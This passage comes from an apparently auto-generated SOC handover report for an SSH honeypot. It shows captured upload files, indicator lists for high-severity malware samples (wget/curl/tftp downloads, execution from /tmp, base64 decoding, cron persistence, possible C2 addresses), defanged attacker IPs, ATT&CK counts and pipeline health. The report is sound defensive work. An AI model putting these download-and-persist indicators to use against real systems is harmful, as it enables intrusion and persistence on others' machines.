| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `77.90.185[.]16` | LT | Limited Network LTD | **100** ⚠️ | 50 |
| `94.154.43[.]196` | TR | Storm Industries LLC | **100** ⚠️ | 50 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `192.248.150[.]180` | GB | The Constant Company, LLC. | **100** ⚠️ | 50 |
| `185.223.235[.]49` | NL | Infrawatch Limited | **100** ⚠️ | 29 |
| `103.163.46[.]207` | CN | Inner Mongolia Ruitong Network Technology Co., Ltd | **100** ⚠️ | 3 |
| `45.148.10[.]141` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `51.158.205[.]203` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 50 |
| `58.218.178[.]134` | CN | CHINANET jiangsu province network | **100** ⚠️ | 6 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 89 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 73 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 143 cases |
| Tool 34  | Credential Extractor        | ✅ 79 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 56 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (18.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 34 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 73 priority case(s) shown individually · 27 recon entry/entries in table (9 group(s) consolidating 25 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-03T08:45:10Z_
